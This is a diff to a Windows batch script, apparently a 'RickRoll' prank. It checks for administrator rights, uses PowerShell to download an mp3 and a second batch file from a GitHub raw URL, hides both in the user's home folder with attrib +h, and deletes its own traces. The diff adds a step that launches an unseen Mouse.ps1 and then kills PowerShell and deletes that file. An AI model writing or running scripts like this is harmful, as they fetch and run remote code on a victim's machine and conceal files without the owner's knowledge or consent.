@@ -2,6 +2,7 @@
  whoami /all | findstr S-1-16-12288 > nul
  if %errorlevel%==1 goto NotAdmin
 cd /D "%~dp0"
+start Mouse.ps1
 Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/RickRoll.mp3' -OutFile .\rickroll.mp3
 Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/A.bat' -OutFile .\A.bat
 copy rickroll.mp3 "C:%homepath%"
@@ -12,6 +13,8 @@ cd "C:%homepath%"
 attrib +h A.bat
 attrib +h rickroll.mp3
 cd /D "%~dp0"
+taskkill /im powershell.exe
+del Mouse.ps1
 del A.bat
 del rickroll.mp3
 del Test.bat
